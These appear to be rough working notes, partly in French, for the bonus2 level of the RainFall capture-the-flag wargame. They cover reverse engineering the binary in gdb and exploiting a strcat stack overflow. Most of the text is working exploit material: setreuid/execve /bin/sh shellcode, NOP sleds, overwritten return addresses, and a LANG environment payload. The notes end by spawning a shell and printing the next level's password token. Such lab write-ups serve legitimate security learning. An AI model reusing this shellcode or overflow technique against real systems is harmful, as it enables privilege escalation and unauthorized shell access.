``` bash
bonus2@RainFall:~$ ltrace ./bonus2 aaaaaaaaaaaa bbbbbbbbbb
__libc_start_main(0x8048529, 3, 0xbffff7d4, 0x8048640, 0x80486b0 <unfinished ...>
strncpy(0xbffff6d0, "aaaaaaaaaaaa", 40)                                   = 0xbffff6d0
strncpy(0xbffff6f8, "bbbbbbbbbb", 32)                                     = 0xbffff6f8
getenv("LANG")                                                            = "en_US.UTF-8"
memcmp(0xbfffff16, 0x804873d, 2, 0xb7fff918, 0)                           = -1
memcmp(0xbfffff16, 0x8048740, 2, 0xb7fff918, 0)                           = -1
strcat("Hello ", "aaaaaaaaaaaa")                                          = "Hello aaaaaaaaaaaa"
puts("Hello aaaaaaaaaaaa"Hello aaaaaaaaaaaa
)                                                = 19
+++ exited (status 19) +++

```


``` bash
(gdb) disas main
Dump of assembler code for function main:
   0x08048529 <+0>:	push   ebp
   0x0804852a <+1>:	mov    ebp,esp
   0x0804852c <+3>:	push   edi
   0x0804852d <+4>:	push   esi
   0x0804852e <+5>:	push   ebx
   0x0804852f <+6>:	and    esp,0xfffffff0
   0x08048532 <+9>:	sub    esp,0xa0
   0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3              # comparaison nombre d'arg
   0x0804853c <+19>:	je     0x8048548 <main+31>
   0x0804853e <+21>:	mov    eax,0x1
   0x08048543 <+26>:	jmp    0x8048630 <main+263>
   0x08048548 <+31>:	lea    ebx,[esp+0x50]                       # argv[1]
   0x0804854c <+35>:	mov    eax,0x0
   0x08048551 <+40>:	mov    edx,0x13
   0x08048556 <+45>:	mov    edi,ebx
   0x08048558 <+47>:	mov    ecx,edx
   0x0804855a <+49>:	rep stos DWORD PTR es:[edi],eax
   0x0804855c <+51>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804855f <+54>:	add    eax,0x4
   0x08048562 <+57>:	mov    eax,DWORD PTR [eax]
   0x08048564 <+59>:	mov    DWORD PTR [esp+0x8],0x28
   0x0804856c <+67>:	mov    DWORD PTR [esp+0x4],eax
   0x08048570 <+71>:	lea    eax,[esp+0x50]                       # argv[1]
   0x08048574 <+75>:	mov    DWORD PTR [esp],eax
   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>
   0x0804857c <+83>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804857f <+86>:	add    eax,0x8
   0x08048582 <+89>:	mov    eax,DWORD PTR [eax]
   0x08048584 <+91>:	mov    DWORD PTR [esp+0x8],0x20
   0x0804858c <+99>:	mov    DWORD PTR [esp+0x4],eax
   0x08048590 <+103>:	lea    eax,[esp+0x50]                       # argv[1]
   0x08048594 <+107>:	add    eax,0x28
   0x08048597 <+110>:	mov    DWORD PTR [esp],eax
   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
   0x0804859f <+118>:	mov    DWORD PTR [esp],0x8048738
   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
   0x080485ab <+130>:	mov    DWORD PTR [esp+0x9c],eax
   0x080485b2 <+137>:	cmp    DWORD PTR [esp+0x9c],0x0
   0x080485ba <+145>:	je     0x8048618 <main+239>
   0x080485bc <+147>:	mov    DWORD PTR [esp+0x8],0x2
   0x080485c4 <+155>:	mov    DWORD PTR [esp+0x4],0x804873d    # 0x804873d == "fi"
   0x080485cc <+163>:	mov    eax,DWORD PTR [esp+0x9c]
   0x080485d3 <+170>:	mov    DWORD PTR [esp],eax              # retour de getenv == "fi"
   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>   #memcmp("fi", "fi", 2, )
   0x080485db <+178>:	test   eax,eax
   0x080485dd <+180>:	jne    0x80485eb <main+194>
   0x080485df <+182>:	mov    DWORD PTR ds:0x8049988,0x1       # variable globale init <langage> = 1
   0x080485e9 <+192>:	jmp    0x8048618 <main+239>
   0x080485eb <+194>:	mov    DWORD PTR [esp+0x8],0x2
   0x080485f3 <+202>:	mov    DWORD PTR [esp+0x4],0x8048740
   0x080485fb <+210>:	mov    eax,DWORD PTR [esp+0x9c]
   0x08048602 <+217>:	mov    DWORD PTR [esp],eax
   0x08048605 <+220>:	call   0x8048360 <memcmp@plt>
   0x0804860a <+225>:	test   eax,eax
   0x0804860c <+227>:	jne    0x8048618 <main+239>
   0x0804860e <+229>:	mov    DWORD PTR ds:0x8049988,0x2       # <langage> = 2
   0x08048618 <+239>:	mov    edx,esp                          # JMP
   0x0804861a <+241>:	lea    ebx,[esp+0x50]                   # argv[1]
   0x0804861e <+245>:	mov    eax,0x13
   0x08048623 <+250>:	mov    edi,edx
   0x08048625 <+252>:	mov    esi,ebx
   0x08048627 <+254>:	mov    ecx,eax                          # ecx = compteur -> 19
   0x08048629 <+256>:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]      # esi=argv[1] copié dans edi
   0x0804862b <+258>:	call   0x8048484 <greetuser>
   0x08048630 <+263>:	lea    esp,[ebp-0xc]
   0x08048633 <+266>:	pop    ebx
   0x08048634 <+267>:	pop    esi
   0x08048635 <+268>:	pop    edi
   0x08048636 <+269>:	pop    ebp
   0x08048637 <+270>:	ret    
End of assembler dump.

```


``` bash
(gdb) disas greetuser
Dump of assembler code for function greetuser:
   0x08048484 <+0>:	    push   ebp
   0x08048485 <+1>:	    mov    ebp,esp
   0x08048487 <+3>:	    sub    esp,0x58
   0x0804848a <+6>:	    mov    eax,ds:0x8049988             # <language>
   0x0804848f <+11>:	cmp    eax,0x1
   0x08048492 <+14>:	je     0x80484ba <greetuser+54>     # "fi"
   0x08048494 <+16>:	cmp    eax,0x2
   0x08048497 <+19>:	je     0x80484e9 <greetuser+101>    # "nl" ?
   0x08048499 <+21>:	test   eax,eax
   0x0804849b <+23>:	jne    0x804850a <greetuser+134>    # "en" ???
   0x0804849d <+25>:	mov    edx,0x8048710
   0x080484a2 <+30>:	lea    eax,[ebp-0x48]
   0x080484a5 <+33>:	mov    ecx,DWORD PTR [edx]
   0x080484a7 <+35>:	mov    DWORD PTR [eax],ecx
   0x080484a9 <+37>:	movzx  ecx,WORD PTR [edx+0x4]
   0x080484ad <+41>:	mov    WORD PTR [eax+0x4],cx
   0x080484b1 <+45>:	movzx  edx,BYTE PTR [edx+0x6]
   0x080484b5 <+49>:	mov    BYTE PTR [eax+0x6],dl
   0x080484b8 <+52>:	jmp    0x804850a <greetuser+134>    # "en" ???
   0x080484ba <+54>:	mov    edx,0x8048717                # "fi"
   0x080484bf <+59>:	lea    eax,[ebp-0x48]
   0x080484c2 <+62>:	mov    ecx,DWORD PTR [edx]
   0x080484c4 <+64>:	mov    DWORD PTR [eax],ecx
   0x080484c6 <+66>:	mov    ecx,DWORD PTR [edx+0x4]
   0x080484c9 <+69>:	mov    DWORD PTR [eax+0x4],ecx
   0x080484cc <+72>:	mov    ecx,DWORD PTR [edx+0x8]
   0x080484cf <+75>:	mov    DWORD PTR [eax+0x8],ecx
   0x080484d2 <+78>:	mov    ecx,DWORD PTR [edx+0xc]
   0x080484d5 <+81>:	mov    DWORD PTR [eax+0xc],ecx
   0x080484d8 <+84>:	movzx  ecx,WORD PTR [edx+0x10]
   0x080484dc <+88>:	mov    WORD PTR [eax+0x10],cx
   0x080484e0 <+92>:	movzx  edx,BYTE PTR [edx+0x12]
   0x080484e4 <+96>:	mov    BYTE PTR [eax+0x12],dl
   0x080484e7 <+99>:	jmp    0x804850a <greetuser+134>
   0x080484e9 <+101>:	mov    edx,0x804872a                # "nl" ?
   0x080484ee <+106>:	lea    eax,[ebp-0x48]
   0x080484f1 <+109>:	mov    ecx,DWORD PTR [edx]
   0x080484f3 <+111>:	mov    DWORD PTR [eax],ecx
   0x080484f5 <+113>:	mov    ecx,DWORD PTR [edx+0x4]
   0x080484f8 <+116>:	mov    DWORD PTR [eax+0x4],ecx
   0x080484fb <+119>:	mov    ecx,DWORD PTR [edx+0x8]
   0x080484fe <+122>:	mov    DWORD PTR [eax+0x8],ecx
   0x08048501 <+125>:	movzx  edx,WORD PTR [edx+0xc]
   0x08048505 <+129>:	mov    WORD PTR [eax+0xc],dx
   0x08048509 <+133>:	nop
   0x0804850a <+134>:	lea    eax,[ebp+0x8]                # "en" ???
   0x0804850d <+137>:	mov    DWORD PTR [esp+0x4],eax
   0x08048511 <+141>:	lea    eax,[ebp-0x48]
   0x08048514 <+144>:	mov    DWORD PTR [esp],eax
   0x08048517 <+147>:	call   0x8048370 <strcat@plt>   
   0x0804851c <+152>:	lea    eax,[ebp-0x48]
   0x0804851f <+155>:	mov    DWORD PTR [esp],eax
   0x08048522 <+158>:	call   0x8048390 <puts@plt>
   0x08048527 <+163>:	leave  
   0x08048528 <+164>:	ret   
```


fi = Segfault quand argv[1] == 40 && argv[2] == 14 octets ---> 67

```
Starting program: /home/user/bonus2/bonus2 $(python2 -c 'import sys; sys.stdout.write("A"*10 + "B"*10 + "C"*10 + "D"*10 + "E"*10 + "F"*10 + "G"*7)') aaaaaaaaaaaaaa
Hyvää päivää AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDaaaaaaaaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
0x43434242 in ?? ()
1: x/i $pc
=> 0x43434242:	<error: Cannot access memory at address 0x43434242>
```

$(python2 -c 'import sys; sys.stdout.write("A"*18 + "B"*4 + "C"*47)') aaaaaaaaaaaaaa


B = eip
C = 47 == 34 + 13


shellcode (34)= "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"

$(python2 -c 'import sys; sys.stdout.write("A"*18 + "B"*4 + "\x90" * 13 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")') aaaaaaaaaaaaaa


$(python2 -c 'import sys; sys.stdout.write("A"*18 + "\x10\xf6\xff\xbf" + "\x90" * 13 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")') aaaaaaaaaaaaaa

en -> 72

$(python2 -c 'import sys; sys.stdout.write("A"*10 + "B"*10 + "C"*10 + "D"*10)') $(python2 -c 'import sys; sys.stdout.write("E"*4 + "F"*4 + "G"*6)')
aaaaaaaaaaaaa


$(python2 -c 'import sys; sys.stdout.write("A"*4 + "B"*4 + "C"*4 + "D"*4 + "E"*4 + "F"*4 +"G"*4 + "H"*4 + "I"*4 +"J"*4)') $(python2 -c 'import sys; sys.stdout.write("a"*18 + "b" * 4 + "c"*34)')
Hyvää päivää AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJaaaaaaaaaaaaaaaaaabbbbcccccccccc

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()

(gdb) print (char *) getenv("SHELLCODE")

$(python2 -c 'import sys; sys.stdout.write("A"*4 + "B"*4 + "C"*4 + "D"*4 + "E"*4 + "F"*4 +"G"*4 + "H"*4 + "I"*4 +"J"*4)') $(python2 -c 'import sys; sys.stdout.write("a"*18 + "\x81\xf8\xff\xbf" + "c"*34)')




----

PEU DE NOP

$(python2 -c 'import sys; sys.stdout.write("\x90"*6 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")') $(python2 -c 'import sys; sys.stdout.write("B"*18 + "\xf2\xf5\xff\xbf" + "D"*10)')



SHELLCODE 1

$(python2 -c 'import sys; sys.stdout.write("\x90"*22 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52")') $(python2 -c 'import sys; sys.stdout.write("\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "B" * 2 + "\xf5\xf5\xff\xbf" + "D"*10)')



SHELLCODE 2

"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"


$(python2 -c 'import sys; sys.stdout.write("\x90"*20 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x31\xd2\x52")') $(python2 -c 'import sys; sys.stdout.write("\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "B" * 2 + "\xf5\xf5\xff\xbf" + "D"*10)')



(gdb) x/50x $esp
0xbffff5d0:	0xbffff5e0	0xbffff630	0x00000001	0x00000000
0xbffff5e0:	0xc3767948	0x20a4c3a4	0x69a4c370	0xc3a4c376
0xbffff5f0:	0x909020a4	0x90909090	0x90909090	0x90909090
0xbffff600:	0x90909090	0x90909090	0x316a9090	0x80cd9958
0xbffff610:	0xc189c389	0xcd58466a	0x520bb080	0x732f6e68
0xbffff620:	0x2f2f6868	0xe3896962	0x80cdd189	0x41414141
0xbffff630:	0x44444444	0x44444444	0x90004444	0x90909090
0xbffff640:	0x90909090	0x90909090	0x9958316a	0xc38980cd
0xbffff650:	0x466ac189	0xb080cd58	0x6e68520b	0x6868732f
0xbffff660:	0x69622f2f	0xd189e389	0x414180cd	0x44444141
0xbffff670:	0x44444444	0x44444444	0x00000000	0xb7e5ec73
0xbffff680:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff690:	0x90909090	0x90909090





bonus2@RainFall:~$ ./bonus2 $(python2 -c 'import sys; sys.stdout.write("\x90"*6 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")') $(python2 -c 'import sys; sys.stdout.write("B"*18 + "\x08\xf6\xff\xbf" + "D"*10)')
Hyvää päivää ������j1X�̀�É�jFX̀�
                              Rhn/shh//bi���̀BBBBBBBBBBBBBBBBB���DDDDDDDDDD

$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab


export LANG= $(python2 -c 'import sys; sys.stdout.write("fi" + "\x90" * 100 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")')

$(python2 -c 'import sys; sys.stdout.write("A"*40)') $(python2 -c 'import sys; sys.stdout.write("B"*18 + "\xb5\xfe\xff\xbf" + "D"*4 + "E"*5)')

result


Trouver adresse var d'env =
x/20s *((char**)environ)


``` bash
export LANG=$(python2 -c 'import sys; sys.stdout.write("fi" + "\x90" * 100 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")')


bonus2@RainFall:~$ ./bonus2 $(python2 -c 'import sys; sys.stdout.write("A"*40)') $(python2 -c 'import sys; sys.stdout.write("B"*18 + "\xb5\xfe\xff\xbf" + "D"*4 + "E"*5)')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����DDDDEEEEE
$ id
uid=2013(bonus3) gid=2012(bonus2) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

0xbffffeb5